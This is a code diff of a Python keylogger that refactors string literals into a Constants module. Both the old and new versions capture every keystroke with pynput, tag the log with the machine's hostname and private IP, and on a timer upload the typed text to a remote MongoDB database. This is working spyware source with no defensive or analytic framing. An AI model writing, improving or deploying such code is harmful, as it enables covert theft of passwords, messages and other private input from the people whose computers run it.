@@ -1,19 +1,12 @@
-import pynput
+import Constants, pynput, datetime, os, threading, socket, logging
+
 from pynput.keyboard import Key, Listener
 from pymongo import MongoClient
-import logging
-import socket
-import ipgetter2
-import threading
-import datetime
-import os
 
-start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-# print(start_time)
 
-uri = os.environ.get("MONGO_CONN_STRING")
+start_time = datetime.datetime.now().strftime(Constants.time_format_setting)
 
-# print(uri)
+uri = os.environ.get(Constants.connection_string)
 
 keys_typed = ""
 log = ""
@@ -22,19 +15,11 @@ try:
 	client = MongoClient(uri,
     	connectTimeoutMS=30000,
         socketTimeoutMS=None)
-	# print("Connection successful")
-	# print()
 except:
-	# print("Connection unsuccessful")
+	 print("Connection unsuccessful")
 
-# print(client)
-# print()
-
-db = client["Logged_Keys"]
-keys = db["keys"]
-
-# print("connected")
-# print()
+db = client[Constants.database]
+keys = db[Constants.collection]
 
 def set_time_to_store_data(function_to_execute, seconds_till_timout):
     def function_wrapper():
@@ -43,40 +28,43 @@ def set_time_to_store_data(function_to_execute, seconds_till_timout):
 
     timer = threading.Timer(seconds_till_timout, function_wrapper)
     timer.start()
+
     return timer
 
 def store_in_database() :
+	complete_log()
+
+	try:
+		keys.insert_one({ Constants.log_title : log })
+		reset_log()
+	except:
+		 print("Something went wrong")
+
+def complete_log() :
 	global log 
 	global keys_typed
 
 	log += keys_typed
 
-	try:
-		keys.insert_one({ "Keylog" : log })
-		log = ""
-		keys_typed = ""
-		# print("Successful insert")
-	except:
-		# print("Something went wrong")
+def reset_log() :
+	global log
+	global keys_typed
+	log = ""
+	keys_typed = ""
 
-def writeText(host_name, host_ip):
+def writeText(host_name, host_ip) :
     global log
     log += ("Start Time " + start_time + "\n")
     log += ("Hostname: " + host_name + "\n")
     log += ("Private IP: " + host_ip + "\n")
 
 def get_host_name_IP(): 
-    global external_ip
     try: 
         host_name = socket.gethostname() 
         host_ip = socket.gethostbyname(host_name)
-        
-        # print("Hostname:", host_name) 
-        # print("Private IP:", host_ip)
+       
         writeText(host_name, host_ip)
     except: 
-        external_ip = "N/A"
-        # print("Unable to get Hostname and IP")
         writeText(host_name, host_ip)
 
 def start_logging():
@@ -85,21 +73,19 @@ def start_logging():
 
 start_logging()
 
-def on_key_press(key):
+def on_key_press(key) :
 	global keys_typed
 
 	keyString = str(key).replace("'","")
 
-	if(keyString == "Key.space"):
+	if(keyString == Constants.recorded_space):
 		keys_typed += " "
-		# print(" ", end="", flush=True)
-	elif(keyString == "Key.shift"):
+	elif(keyString == Constants.recorded_shift):
 		pass
 	else:
-		# print("{0}".format(keyString), end="", flush=True)
 		keys_typed += keyString
 
-def on_key_release(key):
+def on_key_release(key) :
 	pass
 
 with Listener(on_press=on_key_press, on_release=on_key_release) as keyListener :
